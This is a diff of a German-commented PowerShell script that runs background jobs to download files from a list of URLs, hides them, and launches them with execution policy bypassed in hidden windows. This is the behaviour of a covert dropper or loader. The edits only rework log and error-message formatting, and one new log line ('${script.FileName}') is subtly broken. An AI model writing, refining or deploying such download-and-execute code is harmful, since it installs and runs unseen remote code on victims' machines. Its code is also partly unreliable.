@@ -49,11 +49,12 @@ foreach ($script in $scripts) {
             $filePath = Join-Path $targetDir $fileName
             Invoke-WebRequest -Uri $url -OutFile $filePath -UseBasicParsing -ErrorAction SilentlyContinue
             Set-HiddenAttribute -path $filePath  # File hidden machen
-            Add-Content -Path $logPath -Value "$(Get-Date): DOWNLOADED $fileName nach $filePath" -ErrorAction SilentlyContinue
+            Add-Content -Path $logPath -Value "$(Get-Date): DOWNLOADED ${fileName} nach $filePath" -ErrorAction SilentlyContinue
             Write-Output "DOWNLOADED: $fileName -> $filePath"
         } catch {
-            Add-Content -Path $logPath -Value "$(Get-Date): DOWNLOAD FEHLER $fileName: $($_.Exception.Message)" -ErrorAction SilentlyContinue
-            Write-Output "ERROR DOWNLOAD: $fileName - $($_.Exception.Message)"
+            $errorMsg = $_.Exception.Message
+            Add-Content -Path $logPath -Value "$(Get-Date): DOWNLOAD FEHLER ${fileName} : $errorMsg" -ErrorAction SilentlyContinue
+            Write-Output "ERROR DOWNLOAD: $fileName - $errorMsg"
         }
     } -ArgumentList $script.Url, $script.FileName, $targetDir, $logPath
     $downloadJobs += $job
@@ -81,11 +82,12 @@ foreach ($script in $scripts) {
                 $processArgs = @("-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", "`"$filePath`"")
             }
             Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow | Out-Null  # BG-Exec
-            Add-Content -Path $logPath -Value "$(Get-Date): EXEC $($script.FileName) aus $filePath" -ErrorAction SilentlyContinue
+            Add-Content -Path $logPath -Value "$(Get-Date): EXEC ${script.FileName} aus $filePath" -ErrorAction SilentlyContinue
             Write-Host "SUCCESS EXEC: $($script.FileName)"  # Debug
         } catch {
-            Add-Content -Path $logPath -Value "$(Get-Date): EXEC FEHLER $($script.FileName): $($_.Exception.Message)" -ErrorAction SilentlyContinue
-            Write-Host "ERROR EXEC: $($script.FileName) - $($_.Exception.Message)"
+            $errorMsg = $_.Exception.Message
+            Add-Content -Path $logPath -Value "$(Get-Date): EXEC FEHLER ${script.FileName} : $errorMsg" -ErrorAction SilentlyContinue
+            Write-Host "ERROR EXEC: $($script.FileName) - $errorMsg"
         }
     } else {
         Write-Host "NO FILE: $($script.FileName) nicht gedownloaded!"  # Debug
